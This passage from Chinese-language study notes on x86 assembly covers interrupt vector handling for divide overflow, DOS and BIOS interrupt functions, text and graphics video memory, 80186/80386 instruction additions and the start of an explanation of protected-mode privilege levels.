0000:[4*\u4e2d\u65ad\u53f7]\uff0c\u4f8b\u5982 word ptr 0:[20h] \u5b58\u653e 8h \u65f6\u949f\u4e2d\u65ad\u7684\u504f\u79fb\u5730\u5740\uff0cword ptr 0:[22h] \u5b58\u653e\u65f6\u949f\u4e2d\u65ad\u7684\u6bb5\u5730\u5740 \u66f4\u6539\u4e2d\u65ad\u5411\u91cf \u00b6 \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4ee4 es \u4e3a 0\uff0c\u901a\u8fc7 es:[...] \u7684\u65b9\u5f0f\u6765\u66f4\u6539\u4e2d\u65ad\u5411\u91cf\uff0c\u4f46\u7a0b\u5e8f\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u6539\u56de\u6765\uff0c\u800c\u4ea7\u751f\u9519\u8bef\u3002\u56e0\u6b64\u8981\u5728\u6539\u4e4b\u524d\u5b58\u4e0b\u539f\u6765\u7684\u4e2d\u65ad\u5411\u91cf\uff0c\u7a0b\u5e8f\u7ed3\u675f\u524d\u518d\u6539\u56de\u539f\u6765\u7684\u4e2d\u65ad\u5411\u91cf \u4f8b code segment assume cs : code old_00h dw 0 , 0 int_00h: mov ch , 10 h iret main: push cs pop ds xor ax , ax mov es , ax mov bx , 0 mov ax , es :[ bx ] mov dx , es :[ bx + 2 ] mov old_00h [ 0 ], ax mov old_00h [ 2 ], dx mov word ptr es :[ bx ], offset int_00h mov es :[ bx + 2 ], cs mov ax , 123 h mov ch , 1 div ch mov ax , old_00h [ 0 ] mov dx , old_00h [ 2 ] mov es :[ bx ], ax mov es :[ bx + 2 ], dx mov ah , 4 Ch int 21 h code ends end main \u9664\u6cd5\u6ea2\u51fa \u00b6 \u9664\u6cd5\u6ea2\u51fa\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u9664\u4ee5 0 \u4f1a\u6ea2\u51fa \u5546\u65e0\u6cd5\u4fdd\u5b58\u5230 al \u6216 ax \u4e2d\uff0c\u4f1a\u53d1\u751f\u6ea2\u51fa \u6ea2\u51fa\u7684\u65f6\u5019\u4f1a\u5728 div \u6307\u4ee4\u7684\u524d\u9762\u63d2\u5165\u4e00\u6761 int 00 h \u5e76\u8fd0\u884c\uff0cDOS \u6267\u884c 0 \u53f7\u4e2d\u65ad\u4f1a\u8f93\u51fa\u6ea2\u51fa\u4fe1\u606f\u5e76\u7ec8\u6b62\u7a0b\u5e8f \u56e0\u6b64\u4e5f\u5c31\u53ef\u4ee5\u4fee\u6539 0 \u53f7\u4e2d\u65ad\u7684\u4e2d\u65ad\u5411\u91cf\uff0c\u4f7f\u4e4b\u7ee7\u7eed\u8fd0\u884c\uff0c0 \u53f7\u4e2d\u65ad\u9000\u51fa\u540e\u4ecd\u4f1a\u91cd\u65b0\u8fd0\u884c\u521a\u521a\u51fa\u73b0\u95ee\u9898\u7684 div \u6307\u4ee4\uff0c\u4e00\u4e2a\u4f8b\u5b50\u89c1\u4e0a\uff08\u5373\u4fee\u6539\u4e2d\u65ad\u5411\u91cf\u7684\u90a3\u4e2a\u4f8b\u5b50\uff09 \u65f6\u949f\u5ef6\u8fdf \u00b6 DOS \u4e2d\u65ad \u00b6 DOS \u4e2d\u65ad\u5373\u662f int 21h\uff0c\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u96c6\u5305\u542b\u4e86\u6807\u51c6\u8f93\u5165/\u8f93\u51fa\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u5185\u5b58\u7ba1\u7406\u3001\u8fdb\u7a0b\u7ba1\u7406\u7684\u4e2d\u65ad\u8c03\u7528\uff0c\u63d0\u4f9b\u4e86\u8bf8\u591a\u5b50\u529f\u80fd\uff08ah \u4e3a\u529f\u80fd\u53f7\uff09\uff0c\u5b8c\u6574\u89c1 Ralf Brown's Interrupt List \uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u529f\u80fd AH=01h \u529f\u80fd \uff1a\u8f93\u5165\u5b57\u7b26\u529f\u80fd \u4f5c\u7528 \uff1a\u4ece\u952e\u76d8\u8bfb\u5165\u5355\u4e2a\u5b57\u7b26\uff0c\u5982\u679c\u662f Ctrl-Break \u5219\u9000\u51fa\uff0c\u5426\u5219\u5c06\u952e\u503c\u9001\u5165 al \u4e2d AH=02h \u529f\u80fd \uff1a\u8f93\u51fa\u5b57\u7b26\u529f\u80fd \u4f5c\u7528 \uff1a\u5c06 dl \u4ee5\u5b57\u7b26\u7684\u5f62\u5f0f\uff08ASCII\uff09\u6253\u5370\u51fa\u6765 AH=09h \u529f\u80fd \uff1a\u8f93\u51fa\u5b57\u7b26\u4e32\u529f\u80fd \u4f5c\u7528 \uff1a\u5c06 ds:dx \u5904\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u8be5\u5b57\u7b26\u4e32\u5fc5\u987b\u4ee5 '$' \u7ed3\u5c3e AH=0Ah \u529f\u80fd \uff1a\u8f93\u5165\u5b57\u7b26\u4e32\u529f\u80fd \u4f5c\u7528 \uff1ads:dx \u4e3a\u4e00\u4e2a buf\uff0cbuf \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e3a\u5141\u8bb8\u8f93\u5165\u7684\u6700\u591a\u5b57\u7b26\u6570\uff0c\u4e2d\u65ad\u540e\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53d8\u4e3a\u5b9e\u9645\u8f93\u5165\u7684\u5b57\u7b26\u6570\uff0c\u7b2c\u4e09\u4e2a\u5b57\u8282\u5f00\u59cb\u662f\u8f93\u5165\u7684\u5b57\u7b26\u5185\u5bb9\u3002\u5982\u679c\u8f93\u5165\u8d85\u8fc7\u6700\u5927\u5b57\u7b26\u6570\uff0c\u5219\u4f1a\u53d1\u51fa\u94c3\u58f0\uff0c\u5e76\u4e14\u5149\u6807\u4e0d\u518d\u79fb\u52a8 AH=4Ch \u529f\u80fd \uff1a\u7ec8\u6b62\u7a0b\u5e8f\u529f\u80fd \u4f5c\u7528 \uff1a\u9000\u51fa\u5f53\u524d\u7a0b\u5e8f\uff0c\u8fd4\u56de\u7801\u4e3a al\uff08DOS \u4e2d\u4e0d\u4f1a\u5904\u7406\uff0c\u53ef\u4ee5\u4e0d\u5199\uff09 BIOS \u4e2d\u65ad \u00b6 int 10h \u7c7b\u578b \uff1a\u89c6\u9891\u4e2d\u65ad \u5b50\u529f\u80fd \uff1aah = 00h \u53f7\u529f\u80fd\u5207\u6362\u663e\u793a\u6a21\u5f0f al = 03h \u8868\u793a 80*25 \u6587\u672c\u6a21\u5f0f al = 13h \u8868\u793a 320*200*256 \u56fe\u5f62\u6a21\u5f0f \u6587\u672c\u6a21\u5f0f\u7f16\u7a0b \u00b6 \u7a0b\u5e8f\u8fd0\u884c\u65f6\u9ed8\u8ba4\u7ec8\u7aef\u5c31\u5904\u4e8e\u6587\u672c\u6a21\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u5199\u5165\u76f8\u5e94\u5185\u5b58\u5730\u5740\u6765\u66f4\u6539\u663e\u793a\u6587\u672c\u7684\u5185\u5bb9 \u6574\u4e2a\u6587\u672c\u6a21\u5f0f\u7684\u5c4f\u5e55\u5de6\u4e0a\u89d2\u5750\u6807\u4e3a (0, 0)\uff0c\u53f3\u4e0b\u89d2\u5750\u6807\u4e3a (79, 24)\u3002\u5185\u5b58\u7ed3\u6784\u4e3a\u4e00\u4e2a\u5b57\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff08\u9ad8 8 \u4f4d\u4e3a\u663e\u793a\u7684\u5b57\u7b26\uff0c\u4f4e 8 \u4f4d\u4e2d\u9ad8 4 \u4f4d\u4e3a\u80cc\u666f\u8272\uff0c\u4f4e 4 \u4f4d\u4e3a\u524d\u666f\u8272\uff09\uff0c(x, y) \u4f4d\u7f6e\u5904\u7684\u5b57\u7b26\u5bf9\u5e94\u5185\u5b58\u4f4d\u4e8e word ptr B800:[(y*80+x)*2] \u5904 \u7f16\u7a0b\u65f6\u5148\u8bbe\u7f6e es \u4e3a 0B800h\uff0c\u7136\u540e\u8ba1\u7b97\u51fa bx = (y*80+x)*2\uff0c\u7136\u540e\u4ee4 byte ptr es:[bx] = \u5b57\u7b26\uff0cbyte ptr es:[bx+1] = \u989c\u8272 \u56fe\u5f62\u6a21\u5f0f\u7f16\u7a0b \u00b6 \u628a\u663e\u5361\u5207\u6362\u5230\u56fe\u5f62\u6a21\u5f0f\u4f7f\u7528 int 10h \u4e2d\u65ad\uff0c mov ax , 0013 h \u8bbe\u7f6e\u5b50\u529f\u80fd\u53f7\u4e3a 0\uff0c\u6a21\u5f0f\u7f16\u53f7 al \u4e3a 13h \u5373\u56fe\u5f62\u6a21\u5f0f\uff0c\u7136\u540e int 10 h \u5373\u53ef\u5207\u6362\u5230\u56fe\u5f62\u6a21\u5f0f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u662f 320*200 \u5206\u8fa8\u7387\u3001256 \u8272\u7684\u6a21\u5f0f\u3002 \u5c4f\u5e55\u4e0a\u7684\u4e00\u4e2a\u70b9\u5bf9\u5e94\u663e\u5361\u5185\u5b58\u4e0a\u7684\u4e00\u4e2a\u5b57\u8282\uff0c\u8868\u793a\u989c\u8272\u3002\u70b9 (x, y) \u4f4d\u4e8e\u5185\u5b58 0A00:[320*y+x] \u7684\u4f4d\u7f6e\uff0c\u989c\u8272\uff1a 0 \u9ed1 1 \u84dd 2 \u7eff 3 \u9752 4 \u7ea2 5 \u6d0b\u7ea2 6 \u68d5 7 \u767d 8 \u7070 9 \u4eae\u84dd A \u4eae\u7eff B \u4eae\u9752 C \u4eae\u7ea2 D \u7d2b E \u9ec4 F \u4eae\u767d \u7f16\u7a0b\u65f6\u8bbe\u7f6e es \u4e3a 0A00h\uff0c\u7136\u540e\u5411 byte ptr es:[...] \u4e2d\u5199\u5165\u989c\u8272\u7801\u5373\u53ef\u66f4\u6539\u67d0\u5904\u50cf\u7d20\u70b9\u989c\u8272 \u518d\u4f7f\u7528 mov ax , 0003 h \u540e int 10 h \u5207\u6362\u56de\u6587\u672c\u6a21\u5f0f 80x86 \u589e\u52a0\u6307\u4ee4 \u00b6 80186 \u00b6 insb 80186 \u6307\u4ee4\u683c\u5f0f \uff1ainsb / rep insb \u6307\u4ee4\u4f5c\u7528 \uff1a(input from port to string) \u7b49\u4ef7\u4e8e in al, dx; mov es:[di], al \u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a insw 80186 \u6307\u4ee4\u683c\u5f0f \uff1ainsw / rep insw \u6307\u4ee4\u4f5c\u7528 \uff1a(input from port to string) \u7b49\u4ef7\u4e8e in ax, dx; mov es:[di], ax \u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a outsb 80186 \u6307\u4ee4\u683c\u5f0f \uff1aoutsb / rep outsb \u6307\u4ee4\u4f5c\u7528 \uff1a(output string to port) \u7b49\u4ef7\u4e8e mov al, ds:[si]; out al, dx \u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a outsw 80186 \u6307\u4ee4\u683c\u5f0f \uff1aoutsw / rep outsw \u6307\u4ee4\u4f5c\u7528 \uff1a(output string to port) \u7b49\u4ef7\u4e8e mov ax, ds:[si]; out ax, dx \u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a pusha 80186 \u6307\u4ee4\u683c\u5f0f \uff1apusha \u6307\u4ee4\u4f5c\u7528 \uff1apush \u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a ax cx dx bx sp bp si di popa 80186 \u6307\u4ee4\u683c\u5f0f \uff1apopa \u6307\u4ee4\u4f5c\u7528 \uff1apop \u5230\u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a di si bp sp bx dx cx ax \u7acb\u5373\u6570\u8bed\u6cd5\u6269\u5c55 80186 push \u53ef\u4ee5\u76f4\u63a5\u63a5\u7acb\u5373\u6570 imul shl shr sal sar rol ror rcl rcr \u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570 80286 \u00b6 80286 \u589e\u52a0\u4e86\u4fdd\u62a4\u6a21\u5f0f\u53ca\u76f8\u5173\u6307\u4ee4\uff0c\u4e0d\u5199\u5728\u8fd9\u91cc\u4e86 80386 \u00b6 80386\uff08\u5373 i386\uff09\u5347\u7ea7\u5230\u4e86 32 \u4f4d\u67b6\u6784\uff0c\u5bc4\u5b58\u5668\u5747\u53d8\u4e3a 32 \u4f4d\uff08\u4ee5 e \u5f00\u5934\uff09\uff0c\u589e\u52a0\u4e86 fs gs \u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\u3002\u4e00\u4e9b\u6307\u4ee4\u4ece 8086 \u81ea\u7136\u6269\u5c55\u652f\u6301 32 \u4f4d\uff0c\u4e0d\u5728\u6b64\u8d58\u8ff0 bit \u76f8\u5173\u6307\u4ee4 \u00b6 bt 80386 \u6307\u4ee4\u683c\u5f0f \uff1abt src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF bts 80386 \u6307\u4ee4\u683c\u5f0f \uff1abts src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and set) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u8bbe\u4e3a 1 \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF btr 80386 \u6307\u4ee4\u683c\u5f0f \uff1abtr src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and reset) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u8bbe\u4e3a 0 \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF btc 80386 \u6307\u4ee4\u683c\u5f0f \uff1abtc src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and complement) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u53cd\u8f6c \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF bsf 80386 \u6307\u4ee4\u683c\u5f0f \uff1absf dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(bit scan forward) \u5728 src \u4e2d\u641c\u7d22\u6700\u4f4e\u4f4d\u7684 1 \u5bf9\u5e94\u7d22\u5f15\u5b58\u653e\u5728 dest \u4e2d \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u5982\u679c src \u662f 0 \u5219 dest \u4e0d\u53d8\uff0czf \u7f6e\u4e3a 1 \u5426\u5219\u4e3a 0 OF DF IF TF SF ZF AF PF CF bsr 80386 \u6307\u4ee4\u683c\u5f0f \uff1absr dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(bit scan reverse) \u5728 src \u4e2d\u641c\u7d22\u6700\u9ad8\u4f4d\u7684 1 \u5bf9\u5e94\u7d22\u5f15\u5b58\u653e\u5728 dest \u4e2d \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u5982\u679c src \u662f 0 \u5219 dest \u4e0d\u53d8\uff0czf \u7f6e\u4e3a 1 \u5426\u5219\u4e3a 0 OF DF IF TF SF ZF AF PF CF \u6570\u636e\u8f6c\u79fb\u6307\u4ee4 \u00b6 movsx 80386 \u6307\u4ee4\u683c\u5f0f \uff1amovsx dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(move with sign-extension) \u5c06 src \u7b26\u53f7\u6269\u5c55\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u53ef\u4ee5 8 -> 16\u30018 -> 32\u300116 -> 32 movzx 80386 \u6307\u4ee4\u683c\u5f0f \uff1amovsx dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(move with zero-extension) \u5c06 src \u96f6\u6269\u5c55\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u53ef\u4ee5 8 -> 16\u30018 -> 32\u300116 -> 32 pushad 80386 \u6307\u4ee4\u683c\u5f0f \uff1apushad \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 32 \u4f4d\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\u538b\u5165\u5806\u6808\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a eax ecx edx ebx esp ebp esi edi \u6ce8\u610f \uff1apusha \u4ecd\u4e3a\u538b\u5165 16 \u4f4d\u5bc4\u5b58\u5668 popad 80386 \u6307\u4ee4\u683c\u5f0f \uff1apopad \u6307\u4ee4\u4f5c\u7528 \uff1apop \u51fa 32 \u4f4d\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a edi esi ebp esp ebx edx ecx eax \u6ce8\u610f \uff1apopa \u4ecd\u4e3a\u5f39\u51fa 16 \u4f4d\u5bc4\u5b58\u5668 pushfd 80386 \u6307\u4ee4\u683c\u5f0f \uff1apushfd \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 eflags \u538b\u5165\u5806\u6808 \u6ce8\u610f \uff1apushf \u4ecd\u4e3a 16 \u4f4d\uff08\u5373 eflags \u7684\u4f4e 16 \u4f4d\uff09 popfd 80386 \u6307\u4ee4\u683c\u5f0f \uff1apopfd \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u5806\u6808\u5f39\u51fa\u5230 eflags \u6ce8\u610f \uff1apopf \u4ecd\u4e3a 16 \u4f4d\uff08\u5373 eflags \u7684\u4f4e 16 \u4f4d\uff09 OF DF IF TF SF ZF AF PF CF lss 80386 \u6307\u4ee4\u683c\u5f0f \uff1alss dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 ss:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32 lfs 80386 \u6307\u4ee4\u683c\u5f0f \uff1alfs dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 fs:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32 lgs 80386 \u6307\u4ee4\u683c\u5f0f \uff1algs dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 gs:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32 \u8f6c\u6362\u6307\u4ee4 \u00b6 cdq 80386 \u6307\u4ee4\u683c\u5f0f \uff1acdq \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 eax \u6269\u5145\u4e3a edx:eax\uff08\u76f4\u63a5\u62fc\u63a5\uff09\uff0c\u5373\u5c06 eax \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 edx cwde 80386 \u6307\u4ee4\u683c\u5f0f \uff1acwde \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ax \u7b26\u53f7\u6269\u5145\u4e3a eax \u6ce8\u610f \uff1acwd \u4ecd\u4e3a\u5c06 ax \u6269\u5145\u5230 dx:ax \u8fd0\u7b97\u6307\u4ee4 \u00b6 imul \u8bed\u6cd5\u6269\u5c55 80386 \u6307\u4ee4\u683c\u5f0f \uff1aimul dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08\u652f\u6301\u4f20\u5165\u4e24\u4e2a\u64cd\u4f5c\u6570\uff09dest = dest * src\uff0c\u622a\u53d6\u7ed3\u679c\u7684\u4f4e\u4f4d\u5b58\u5165 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5b58\u50a8\u5355\u5143\u3002\u7ed3\u679c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6570\u4e58\u6cd5\u548c\u65e0\u7b26\u53f7\u6570\u4e58\u6cd5\u76f8\u540c shld 80386 \u6307\u4ee4\u683c\u5f0f \uff1ashld r1, r2, imm / shld r1, r2, cl \u6307\u4ee4\u4f5c\u7528 \uff1ar1 = r1< >(register_width - cl) \u6ce8\u610f \uff1ar1 \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cr2 \u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e09\u4e2a\u64cd\u4f5c\u6570\u662f cl \u6216 8 \u4f4d\u7acb\u5373\u6570\u3002cf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5982\u679c\u79fb\u4f4d\u4e3a 1 \u4e14\u7b26\u53f7\u4f4d\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u5219 of \u4e3a 1 \u53cd\u4e4b\u4e3a 0\uff0c\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1\uff0c\u5219 of undefined OF DF IF TF SF ZF AF PF CF shrd 80386 \u6307\u4ee4\u683c\u5f0f \uff1ashrd r1, r2, imm / shrd r1, r2, cl \u6307\u4ee4\u4f5c\u7528 \uff1ar1 = r1>>cl \u2223 r2<<(register_width - cl) \u6ce8\u610f \uff1ar1 \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cr2 \u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e09\u4e2a\u64cd\u4f5c\u6570\u662f cl \u6216 8 \u4f4d\u7acb\u5373\u6570\u3002cf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5982\u679c\u79fb\u4f4d\u4e3a 1 \u4e14\u7b26\u53f7\u4f4d\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u5219 of \u4e3a 1 \u53cd\u4e4b\u4e3a 0\uff0c\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1\uff0c\u5219 of undefined OF DF IF TF SF ZF AF PF CF set cc \u7c7b\u6307\u4ee4 80386 \u6307\u4ee4\u683c\u5f0f \uff1aset cc dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c cc \u6ee1\u8db3\uff0c\u5219\u5c06\u5b57\u8282 dest \u8bbe\u4e3a 1\uff0c\u5426\u5219\u8bbe\u4e3a 0 \u6ce8\u610f \uff1a cc \u540c j cc \uff0cdest \u4e3a 8 \u4f4d\u5bc4\u5b58\u5668\u6216\u5b57\u8282\u5927\u5c0f\u5b58\u50a8\u5355\u5143 \u5b57\u7b26\u4e32\u7c7b\u6307\u4ee4 \u00b6 \u9488\u5bf9 32 \u4f4d\u65b0\u589e CMPSD LODSD SCASD STOSD MOVSD INSD OUTSD \u4e03\u4e2a\u5b57\u7b26\u4e32\u76f8\u5173\u6307\u4ee4\uff0c\u610f\u4e49\u5747\u548c 8086 / 80186 \u7c7b\u4f3c\uff0c\u4e0d\u518d\u8d58\u8ff0 \u63a7\u5236\u8f6c\u79fb\u6307\u4ee4 \u00b6 \u9488\u5bf9 32 \u4f4d\u65b0\u589e IRETD \u6307\u4ee4\uff08\u4e0e IRET \u76f8\u540c\uff0c\u673a\u5668\u7801\u4e5f\u76f8\u540c\uff09\uff0cJECXZ \u6307\u4ee4\uff08jump if ecx equal zero\uff09\u4e0d\u518d\u8d58\u8ff0 80386 \u4fdd\u62a4\u6a21\u5f0f\u539f\u7406 \u00b6 \u5b9e\u6a21\u5f0f\u4e0e\u4fdd\u62a4\u6a21\u5f0f\u7684\u533a\u522b \u00b6 \u5b9e\u6a21\u5f0f\uff08real mode\uff09 \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u5747\u4e3a 16 \u4f4d \u6bb5\u5730\u5740*10h + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740 \u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 10000h \u5b57\u8282 \u6bcf\u4e2a\u6bb5\u540c\u65f6\u5177\u6709 Read Write eXecute \u5c5e\u6027 \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6ca1\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u90fd\u662f ring0\uff08\u6700\u9ad8\u6743\u9650\uff09 \u4fdd\u62a4\u6a21\u5f0f\uff08protected mode\uff09 \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u53ef\u4ee5\u662f 16\u4f4d:16\u4f4d \u4e5f\u53ef\u4ee5\u662f 16\u4f4d:32\u4f4d gdt[\u6bb5\u5730\u5740].base_addr + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740 \u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 4G \u5b57\u8282 \u6570\u636e\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u8bfb\u3001\u8bfb\u5199 \u4ee3\u7801\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u6267\u884c\u4e0d\u53ef\u8bfb\u3001\u53ef\u6267\u884c\u53ef\u8bfb \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e3a ring0\uff0c\u7528\u6237\u4ee3\u7801\u4e3a ring3 \u963b\u6b62 ring3 \u7684\u4ee3\u7801\u8bbf\u95ee ring0 \u7684\u6570\u636e\uff1a mov ax , \u6bb5\u5730\u5740 mov ds , ax ; \u8fd9\u4e00\u6b65\u4f1a\u88ab\u9650\u5236 mov ebx , \u504f\u79fb\u5730\u5740 mov al , ds :[ ebx ] \u5f53\u6bb5\u5bc4\u5b58\u5668\u88ab\u8d4b\u503c\u7684\u65f6\u5019\uff0cCPU \u4f1a\u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u628a\u5f53\u524d cs \u7684\u4f4e 2 \u4f4d\u548c\u6bb5\u5730\u5740\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u6240\u5305\u542b\u7684 DPL \u8fdb\u884c\u6bd4\u8f83\u5982\u679c \u201ccs.cpl <= \u6bb5\u5730\u5740->\u63cf\u8ff0\u7b26.DPL\u201d \u5219\u5141\u8bb8\u8bbf\u95ee\uff0c\u5426\u5219\u4ea7\u751f General Protection Fault CPL\uff08current privilege level\uff09\u5373 cs \u7684\u4f4e 2 \u4f4d\uff0c\u8868\u793a\u5f53\u524d\u7a0b\u5e8f\u7684\u6743\u9650\uff0cDPL\uff08descriptor privilege 